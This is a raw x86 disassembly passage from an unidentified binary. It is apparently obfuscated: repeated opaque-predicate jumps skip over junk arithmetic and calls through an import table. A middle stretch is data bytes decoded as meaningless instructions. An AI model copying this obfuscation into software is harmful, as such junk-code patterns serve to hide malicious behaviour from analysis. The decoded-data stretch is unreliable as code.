  41efb7:	cmp    DWORD PTR ds:0x42833b,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e5c
  41efd7:	sub    edx,DWORD PTR ds:0x42826f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42828b
  41efe4:	mov    DWORD PTR ds:0x4283d3,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42827b
  41eff4:	xor    edx,DWORD PTR ds:0x4282e7
  41effa:	and    DWORD PTR ds:0x4283e7,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x18a585b0
  41f021:	stos   BYTE PTR es:[edi],al
  41f022:	cdq    
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx+0x11181812],ah
  41f02b:	sub    ecx,DWORD PTR [ecx+ebp*1]
  41f02e:	std    
  41f02f:	icebp  
  41f030:	sub    esp,DWORD PTR [esi-0x6af9bb31]
  41f036:	pop    esp
  41f037:	ja     0x41f0ae
  41f039:	jp     0x41f052
  41f03b:	mov    edi,0xcb846237
  41f040:	inc    esp
  41f041:	mov    BYTE PTR [edi-0x8],dh
  41f044:	mov    bl,0x2a
  41f046:	nop
  41f047:	mov    ds:0x84b8a216,eax
  41f04c:	mov    cl,0x47
  41f04e:	cmp    edi,esp
  41f050:	fidivr DWORD PTR [ecx+eax*8-0x1b]
  41f054:	pop    edx
  41f055:	mov    ebx,0xabd5aec0
  41f05a:	inc    esp
  41f05b:	pushf  
  41f05c:	push   ebx
  41f05d:	adc    esp,DWORD PTR [ebx-0x43]
  41f060:	inc    eax
  41f061:	inc    ecx
  41f062:	lods   al,BYTE PTR ds:[esi]
  41f063:	xchg   esp,eax
  41f064:	icebp  
  41f065:	jmp    0xce697e03
  41f06a:	xchg   esi,eax
  41f06b:	sub    DWORD PTR [eax+0x44],ebx
  41f06e:	sti    
  41f06f:	mov    ah,0xc6
  41f071:	pop    ss
  41f072:	sub    al,0x3a
  41f074:	pop    eax
  41f075:	cmp    DWORD PTR [esi-0x16741abb],0xffffffcb
  41f07c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f07d:	je     0x41f07f
  41f07f:	scas   al,BYTE PTR es:[edi]
  41f080:	ja     0x41f003
  41f082:	xchg   ebp,eax
  41f083:	sub    BYTE PTR [ebx+0x5f],bh
  41f086:	mov    eax,0x268327f5
  41f08b:	outs   dx,DWORD PTR ds:[esi]
  41f08c:	sub    BYTE PTR [ebx+edi*8-0x41],bl
  41f090:	iret   
  41f091:	sbb    edx,DWORD PTR [edi+0x3342fd1e]
  41f097:	mov    edi,0x168b69ac
  41f09c:	mov    ah,0xc1
  41f09e:	push   edx
  41f09f:	je     0x41f05e
  41f0a1:	ins    DWORD PTR es:[edi],dx
  41f0a2:	push   esi
  41f0a3:	fwait
  41f0a4:	push   ds
  41f0a5:	xor    al,0xbb
  41f0a7:	fwait
  41f0a8:	adc    DWORD PTR [esp+ebp*4],0xd7d5aa53
  41f0af:	sar    DWORD PTR [edx+0x6016a350],0x46
  41f0b6:	jbe    0x41f112
  41f0b8:	fisubr WORD PTR [ecx]
  41f0ba:	xor    DWORD PTR [edx],ebp
  41f0bc:	mov    ch,0x75
  41f0be:	div    BYTE PTR [edi+0x1d]
  41f0c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0c2:	and    eax,0x6b9f036d
  41f0c7:	inc    ebx
  41f0c8:	es adc al,0xf0
  41f0cb:	in     eax,dx
  41f0cc:	or     DWORD PTR ds:0xb327686,eax
  41f0d2:	mov    eax,0x950b7b41
  41f0d7:	lock sub BYTE PTR [edx+eax*1],ah
  41f0db:	sbb    DWORD PTR ds:0xdf1134e2,edi
  41f0e1:	jne    0x41f15e
  41f0e3:	scas   eax,DWORD PTR es:[edi]
  41f0e4:	sbb    ah,al
  41f0e6:	ficomp WORD PTR [ecx+0x50f9f700]
  41f0ec:	call   0x297:0xfa285569
  41f0f3:	xchg   esi,eax
  41f0f4:	ds push es
  41f0f6:	mov    BYTE PTR [esi+ebp*1+0x6c],0x3d
  41f0fb:	jmp    0x873e:0xc2273aa
  41f102:	aas    
  41f103:	bound  edi,QWORD PTR ds:0x54859378
  41f109:	push   cs
  41f10a:	or     al,0xcf
  41f10c:	mov    esi,0x3303e4f1
  41f111:	lock push ebx
  41f113:	mov    eax,ds:0x351c0c9c
  41f118:	int    0xc4
  41f11a:	adc    cl,BYTE PTR [ebx-0x38]
  41f11d:	out    0xcf,eax
  41f11f:	(bad)  
  41f121:	push   edx
  41f122:	icebp  
  41f123:	and    al,0x7c
  41f125:	fidiv  DWORD PTR [esi-0x26]
  41f128:	jle    0x41f0ce
  41f12a:	inc    esi
  41f12b:	stc    
  41f12c:	jno    0x41f11f
  41f12e:	inc    eax
  41f12f:	cmp    DWORD PTR [esi+0x3f659731],0x6b30212e
  41f139:	js     0x41f12e
  41f13b:	dec    eax
  41f13c:	pop    eax
  41f13d:	bound  esp,QWORD PTR [ebx+0x11eff322]
  41f143:	add    eax,0xf8e99ef9
  41f148:	inc    esp
  41f149:	push   esp
  41f14a:	xor    al,0x61
  41f14c:	lea    esi,[ebp-0x599e706d]
  41f152:	xlat   BYTE PTR ds:[ebx]
  41f153:	add    eax,0x7ec9aa1
  41f158:	test   DWORD PTR [edx+0x4c493b47],esi
  41f15e:	mov    cl,0x9c
  41f160:	clc    
  41f161:	mov    ch,0x82
  41f163:	loopne 0x41f1cd
  41f165:	cwde   
  41f166:	add    bh,BYTE PTR [edi-0x17e80437]
  41f16c:	sub    ecx,DWORD PTR [ecx+0x55a62003]
  41f172:	jb     0x41f1e1
  41f174:	mov    edi,0x6f36535d
  41f179:	inc    eax
  41f17a:	out    dx,al
  41f17b:	add    BYTE PTR [edx+0x15603ba],ch
  41f181:	inc    esp
  41f182:	mov    ds:0x8bb35764,al
  41f187:	push   esp
  41f188:	mov    eax,0x2b13e5ab
  41f18d:	or     al,0xd0
  41f18f:	sub    al,0x8f
  41f191:	xchg   edx,eax
  41f192:	out    0xa2,al
  41f194:	mov    DWORD PTR [ebx+0x4e],esp
  41f197:	mov    ebp,0xe8828548
  41f19c:	das    
  41f19d:	xchg   edi,eax
  41f19e:	call   0x18e61e19
  41f1a3:	xchg   edi,eax
  41f1a4:	sbb    BYTE PTR [ecx+ecx*1-0x7161b315],bh
  41f1ab:	xchg   BYTE PTR [ebp+0x6d288f5f],al
  41f1b1:	pop    ebp
  41f1b2:	std    
  41f1b3:	sub    DWORD PTR [ebp+edi*2-0x77f56c40],edx
  41f1ba:	add    DWORD PTR [esi+0x21d8d635],edi
  41f1c0:	jmp    0x41f177
  41f1c2:	xor    eax,0xede60746
  41f1c7:	mov    ch,BYTE PTR [ebx-0x76d885c4]
  41f1cd:	shl    BYTE PTR [ecx+edx*1],0x59
  41f1d1:	jg     0x41f1a1
  41f1d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1d4:	mov    ds:0xb0654658,eax
  41f1d9:	jno    0x41f176
  41f1db:	div    DWORD PTR [esi]
  41f1dd:	(bad)  
  41f1de:	in     eax,dx
  41f1df:	or     dl,0x8b
  41f1e2:	mov    ebx,0xd8f531dc
  41f1e7:	inc    edi
  41f1e8:	and    bl,dh
  41f1ea:	adc    eax,0x4fee6643
  41f1ef:	and    ah,BYTE PTR [ecx-0xf]
  41f1f2:	mov    ds:0xa7885813,al
  41f1f7:	fld    DWORD PTR [eax-0x37]
  41f1fa:	mov    ebp,db5
  41f1fd:	inc    edi
  41f1fe:	jne    0x41f1a8
  41f200:	les    ecx,FWORD PTR [ecx-0x4e]
  41f203:	xchg   esi,eax
  41f204:	rcr    DWORD PTR [ebx],1
  41f206:	mov    ecx,0x51737779
  41f20b:	or     DWORD PTR [ebx],edi
  41f20d:	jmp    0x41f266
  41f20f:	das    
  41f210:	in     eax,dx
  41f211:	adc    eax,0x41426558
  41f216:	cmp    al,BYTE PTR [ebx+0x77289443]
  41f21c:	mov    cl,0xec
  41f21e:	xor    eax,DWORD PTR [edi+0xf35bbd5]
  41f224:	nop
  41f225:	leave  
  41f226:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41f228:	or     al,0xa6
  41f22a:	adc    BYTE PTR [esi-0x2cdf0721],bh
  41f230:	cwde   
  41f231:	lock retf 
  41f233:	mov    edx,0xe5c31ae9
  41f238:	pop    ecx
  41f239:	dec    edi
  41f23a:	rcr    DWORD PTR [ebx+0x68],cl
  41f23d:	bound  eax,QWORD PTR [edi+0x52a1cd89]
  41f243:	pop    esp
  41f244:	xor    ax,0xfedf
  41f248:	mov    esp,0xaa841b43
  41f24d:	fdivr  QWORD PTR ds:[edi]
  41f250:	xor    al,0xa8
  41f252:	daa    
  41f253:	pop    esi
  41f254:	std    
  41f255:	cmp    esi,esp
  41f257:	popa   
  41f258:	mov    ds:0x95f85105,al
  41f25d:	mov    al,0x7
  41f25f:	inc    edx
  41f260:	je     0x41f22b
  41f262:	stos   BYTE PTR es:[edi],al
  41f263:	fwait
  41f264:	or     esi,DWORD PTR [ecx+0x18369310]
  41f26a:	jle    0x41f266
  41f26c:	sbb    al,0x77
  41f26e:	out    dx,eax
  41f26f:	add    edx,DWORD PTR [edi+0x26]
  41f272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f273:	or     DWORD PTR [esi],ecx
  41f275:	push   ecx
  41f276:	sub    DWORD PTR [eax],esi
  41f278:	or     ebp,DWORD PTR [edi-0x67]
  41f27b:	sub    edi,DWORD PTR [ebp-0x1]
  41f27e:	nop
  41f27f:	mov    fs,WORD PTR [edx+0x2085fee8]
  41f285:	je     0x41f29b
  41f287:	or     eax,0x7642af9f
  41f28c:	jbe    0x41f2f9
  41f28e:	(bad)  
  41f28f:	or     BYTE PTR [ebx+0x4e],cl
  41f292:	jnp    0x41f2e7
  41f294:	jb     0x41f253
  41f296:	loopne 0x41f24b
  41f298:	jb     0x41f2eb
  41f29a:	rcl    BYTE PTR [edi],0x91
  41f29d:	popa   
  41f29e:	inc    edi
  41f29f:	mov    bh,BYTE PTR [edx+0xe]
  41f2a2:	and    eax,0xf358e44f
  41f2a7:	fmul   QWORD PTR [edi-0x62]
  41f2aa:	dec    esp
  41f2ab:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f2ad:	dec    esi
  41f2ae:	idiv   BYTE PTR [edx-0x6df6cf0]
  41f2b4:	cmp    ch,BYTE PTR [esi+0x1013fd30]
  41f2ba:	retf   
  41f2bb:	outs   dx,DWORD PTR ds:[esi]
  41f2bc:	xchg   DWORD PTR [edx],esp
  41f2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2bf:	and    edx,DWORD PTR [ebx+0x6652c69e]
  41f2c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2c6:	adc    DWORD PTR [esi+eax*4+0x61],edx
  41f2ca:	pop    ss
  41f2cb:	inc    BYTE PTR [ecx-0x66]
  41f2ce:	mov    ah,0x3a
  41f2d0:	test   BYTE PTR [edx],bh
  41f2d2:	or     al,0x4
  41f2d4:	inc    ebp
  41f2d6:	dec    eax
  41f2d7:	(bad)  
  41f2d8:	addr16 jnp 0x41f31d
  41f2db:	mov    BYTE PTR [ebp+0x3af57f1b],dl
  41f2e1:	inc    edx
  41f2e2:	cmp    al,0xcf
  41f2e4:	mov    WORD PTR [eax-0x2b1f32ad],ss
  41f2ea:	xchg   edi,eax
  41f2eb:	push   eax
  41f2ec:	and    DWORD PTR [edx+ecx*2+0x50],esi
  41f2f0:	(bad)  
  41f2f1:	jns    0x41f29e
  41f2f3:	jb     0x41f2c4
  41f2f5:	jmp    0xa9feb125
  41f2fa:	js     0x41f2aa
  41f2fc:	(bad)  
  41f2fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2fe:	test   DWORD PTR [esi+0x41b30423],ecx
  41f304:	mov    edx,ds
  41f306:	jp     0x41f2e7
  41f308:	lds    ecx,FWORD PTR [edi+eax*2-0x6ff51922]
  41f30f:	std    
  41f310:	cli    
  41f311:	and    al,0xcf
  41f313:	das    
  41f314:	xchg   esi,eax
  41f315:	dec    esp
  41f316:	or     BYTE PTR [edi+ebp*2+0x76],dh
  41f31a:	jmp    0x59c69230
  41f31f:	aam    0x1d
  41f321:	sbb    bl,BYTE PTR [edi+0x36]
  41f324:	adc    ecx,esp
  41f326:	lds    edi,FWORD PTR [esi]
  41f328:	ins    DWORD PTR es:[edi],dx
  41f329:	stc    
  41f32a:	jns    0x41f31f
  41f32c:	stc    
  41f32d:	or     eax,0x4ad40ba0
  41f332:	sti    
  41f333:	xchg   ebx,eax
  41f334:	sub    cl,BYTE PTR [ecx]
  41f336:	aad    0xc4
  41f338:	jb     0x41f338
  41f33a:	shl    BYTE PTR [edx-0x6a],1
  41f33d:	idiv   DWORD PTR [eax]
  41f33f:	push   ebp
  41f340:	das    
  41f341:	adc    al,0xfd
  41f343:	adc    BYTE PTR [edi],0x57
  41f346:	mov    bl,0x6e
  41f348:	jno    0x41f36a
  41f34a:	test   eax,0x3ddfed31
  41f34f:	imul   ecx,edx,0x7a0db6a3
  41f355:	cdq    
  41f356:	and    BYTE PTR [edi+0x42],0xd2
  41f35a:	loopne 0x41f3a6
  41f35c:	lock pop edx
  41f35e:	dec    ebx
  41f35f:	dec    esp
  41f360:	and    BYTE PTR [edx-0x26],0xf8
  41f364:	jle    0x41f383
  41f366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f367:	ins    BYTE PTR es:[edi],dx
  41f368:	inc    esp
  41f369:	mov    DWORD PTR [ebp-0x70],0x6f89
  41f370:	cmp    DWORD PTR ds:0x428353,0x0
  41f377:	movzx  edx,WORD PTR ds:0x42826f
  41f37e:	mov    ecx,DWORD PTR ds:0x4282b7
  41f384:	mov    ecx,DWORD PTR ds:0x4282a3
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42828f,ebx
  41f397:	cmp    DWORD PTR ds:0x428353,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428163
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e60
  41f3c7:	sub    ecx,DWORD PTR ds:0x428287
  41f3cd:	mov    DWORD PTR ds:0x4281d7,0x2f55
  41f3d7:	and    DWORD PTR ds:0x428333,ebx
  41f3dd:	or     DWORD PTR ds:0x42834b,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x4281df
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428367,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x4281bf,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x4283cb,0x0
  41f428:	mov    DWORD PTR ds:0x42835f,0xae0
  41f432:	mov    DWORD PTR ds:0x42819b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x4283bb
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x428343,ebx
  41f449:	mov    DWORD PTR ds:0x4281bf,0x2430
  41f453:	cmp    DWORD PTR ds:0x4283cb,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f75
  41f468:	call   DWORD PTR ds:0x428ee4
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x4283d7
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x4281d7,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x42832f,0x6486
  41f49d:	mov    DWORD PTR ds:0x42829b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x4282cb,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x4283d3,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x4281d7,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x42803b
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e64
  41f4d7:	neg    DWORD PTR ds:0x4281cb
  41f4dd:	and    DWORD PTR ds:0x4282af,0x428333
  41f4e7:	and    DWORD PTR ds:0x4283af,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x4281c7
  41f4f4:	sbb    edx,DWORD PTR ds:0x42834f
  41f4fa:	mov    DWORD PTR ds:0x4281c7,edx
  41f500:	sub    DWORD PTR ds:0x4282c3,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x4281cf,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x4283d3,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x4281b3,0x0
  41f53b:	mov    DWORD PTR ds:0x4283cf,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42828f,0x6044
  41f55b:	not    DWORD PTR ds:0x42829b
  41f561:	cmp    DWORD PTR ds:0x4281b3,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e68
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428193,edi
  41f5a3:	and    DWORD PTR ds:0x42832b,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x428343
  41f5b0:	add    edx,DWORD PTR ds:0x42833b
  41f5b6:	mov    DWORD PTR ds:0x428343,edx
  41f5bc:	add    DWORD PTR ds:0x428337,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42829b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x4283cf,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x4281db,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42835f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x42834f,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x4283d3,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428297,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x4282ab,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x4282c7,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428293
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x4282df,0x35b0
  41f651:	cmp    DWORD PTR ds:0x4282ab,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e6c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42826b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x428337
  41f67a:	add    DWORD PTR ds:0x42835b,ecx
  41f680:	sbb    DWORD PTR ds:0x4282cf,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x4281a3
  41f68c:	adc    DWORD PTR ds:0x428197,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x4283ff
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42828f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428363,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x428347,0x0
  41f6e5:	mov    DWORD PTR ds:0x42834f,0x6375
  41f6ef:	not    DWORD PTR ds:0x4281af
  41f6f5:	mov    DWORD PTR ds:0x42826b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42827b,0x2351
  41f70a:	mov    DWORD PTR ds:0x4282bf,ebx
  41f710:	cmp    DWORD PTR ds:0x428347,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x4282ab
  41f727:	call   DWORD PTR ds:0x428e70
  41f72d:	movzx  ecx,WORD PTR ds:0x42827b
  41f734:	xor    DWORD PTR ds:0x4283e7,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x4282ab
  41f740:	add    ecx,DWORD PTR ds:0x4282a3
  41f746:	mov    DWORD PTR ds:0x4282ab,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x4282bb
  41f752:	adc    DWORD PTR ds:0x4283cb,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428367,ebx
  41f75f:	sub    DWORD PTR ds:0x4281c7,edx
  41f765:	and    DWORD PTR ds:0x428347,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42835b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x4283c7,0x42833b
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428277,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428287
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42827b,0x4281d7
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x4283c7,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x4282c7
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x4283d3,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x4283b7
  41f7d9:	mov    DWORD PTR ds:0x4283ab,ecx
  41f7df:	mov    DWORD PTR ds:0x42834f,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x4282cf,0xe1
  41f7f8:	mov    DWORD PTR ds:0x4281c7,edi
  41f7fe:	cmp    DWORD PTR ds:0x4283d3,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427fba
  41f813:	push   0x427f21
  41f818:	call   DWORD PTR ds:0x428ee8
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x4283fb
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x4282b7,ecx
  41f830:	adc    DWORD PTR ds:0x42819f,edi
  41f836:	and    DWORD PTR ds:0x4283df,0x3101
  41f840:	mov    DWORD PTR ds:0x4283e7,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x4281af,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42829f
  41f857:	mov    DWORD PTR ds:0x42828b,0x4504
  41f861:	mov    DWORD PTR ds:0x4283bf,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x4283e3
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x42834f,ebx
  41f87c:	cmp    DWORD PTR ds:0x4281af,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427fec
  41f890:	push   0x427ff6
  41f895:	call   DWORD PTR ds:0x428eec
  41f89b:	and    DWORD PTR ds:0x4281c7,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x42834f,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x4283e3
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x4281b7,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x4282a7,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x4283bb,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x4281a3,0x4283df
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x4282b7
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42826f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x428333,0x0
  41f93e:	mov    DWORD PTR ds:0x428343,0x63c0
  41f948:	mov    DWORD PTR ds:0x4281d3,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x4282df
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x428333,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428ef0
  41f979:	sbb    DWORD PTR ds:0x4283e3,0x209
  41f983:	xor    DWORD PTR ds:0x4283d3,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x4282cf,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x4281d3
  41f9bf:	or     DWORD PTR ds:0x4283bf,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x428337,0x0
  41f9d1:	mov    DWORD PTR ds:0x42827b,0x756d
  41f9db:	mov    DWORD PTR ds:0x428333,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x42833b
  41f9f0:	cmp    DWORD PTR ds:0x428337,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e74
  41fa08:	adc    DWORD PTR ds:0x4283cf,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428353,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x4283ab
  41fa1b:	add    DWORD PTR ds:0x4283bb,ecx
  41fa21:	add    DWORD PTR ds:0x4283b3,0x77eb
  41fa2b:	or     DWORD PTR ds:0x428333,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x4282df
  41fa3b:	and    DWORD PTR ds:0x42819f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42828b,0x4281cb
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x4282d3,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x4282b7,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x428347,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x4281d7
  41fa8d:	mov    DWORD PTR ds:0x4281cf,0x4079
  41fa97:	cmp    DWORD PTR ds:0x4282b7,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x4280c3
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e78
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428193
